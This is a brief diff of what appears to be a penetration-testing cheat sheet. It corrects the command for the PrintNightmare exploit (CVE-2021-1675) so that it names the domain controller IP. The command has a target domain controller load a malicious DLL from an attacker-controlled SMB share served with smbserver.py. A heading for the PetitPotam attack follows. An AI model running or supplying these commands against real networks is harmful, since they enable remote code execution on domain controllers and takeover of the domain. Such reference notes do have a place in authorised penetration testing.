@@ -56,7 +56,7 @@ sudo smbserver.py -smb2support [share_name] [path_to_dll]
 ```
 ### Exploit
 ```bash
-sudo python3 CVE-2021-1675.py [domain]/[user]:[pass] '\\[ATK_host]\[share_name]\[filename].dll'
+sudo python3 CVE-2021-1675.py [domain]/[user]:[pass]@[dc-ip] '\\[ATK_host]\[share_name]\[filename].dll'
 ```
 
 ## PetitPotam (MS-EFSRPC) : Unauthenticated
